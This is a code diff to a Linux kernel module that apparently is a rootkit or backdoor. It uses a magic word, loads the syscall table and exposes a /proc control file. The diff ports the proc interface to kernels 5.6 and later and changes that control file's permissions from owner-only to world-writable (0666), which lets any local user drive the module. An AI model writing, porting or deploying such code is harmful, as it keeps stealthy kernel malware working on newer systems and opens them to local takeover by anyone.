@@ -44,7 +44,7 @@ static struct proc_dir_entry *ntshProcFileEntry;
 struct __lkmmod_t{ struct module *this_mod; };
 static char *magic_word;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,5,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,9,0)
 #pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
 #endif
 
@@ -373,6 +373,7 @@ efault_error:
 /**
  * proc file callbacks and defs
  */
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 static const struct file_operations proc_file_fops = {
     .owner =   THIS_MODULE,
     .open  =   open_cb,
@@ -380,6 +381,14 @@ static const struct file_operations proc_file_fops = {
     .release = seq_release,
     .write =   write_cb,
 };
+#else
+static const struct proc_ops proc_file_fops = {
+    .proc_open  =   open_cb,
+    .proc_read  =   seq_read,
+    .proc_release = seq_release,
+    .proc_write =   write_cb,
+};
+#endif
 
 static void do_remove_proc(void) {
     if(ntshProcFileEntry) {
@@ -410,7 +419,7 @@ static int __init ntsh_init(void) {
     ksys = kall_syscall_table_load();
 
 try_reload:
-    ntshProcFileEntry = proc_create(PROCNAME, S_IRUSR | S_IWUSR, NULL, &proc_file_fops);
+    ntshProcFileEntry = proc_create(PROCNAME, 0666, NULL, &proc_file_fops);
     if(lock && !ntshProcFileEntry)
         goto proc_file_error;
     if(!lock) {
